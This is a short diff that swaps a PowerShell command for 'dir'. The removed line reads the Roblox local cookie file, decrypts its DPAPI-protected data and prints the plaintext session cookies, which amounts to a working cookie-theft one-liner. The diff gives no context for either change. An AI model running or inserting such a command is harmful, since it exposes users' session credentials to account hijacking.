@@ -1,1 +1,2 @@
-powershell -c "Add-Type -AssemblyName System.Security;$d=gc '%LOCALAPPDATA%\Roblox\LocalStorage\RobloxCookies.dat' -Raw|ConvertFrom-Json;$b=[Convert]::FromBase64String($d.CookiesData);$dec=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,'CurrentUser');[System.Text.Encoding]::UTF8.GetString($dec)"
+dir
+
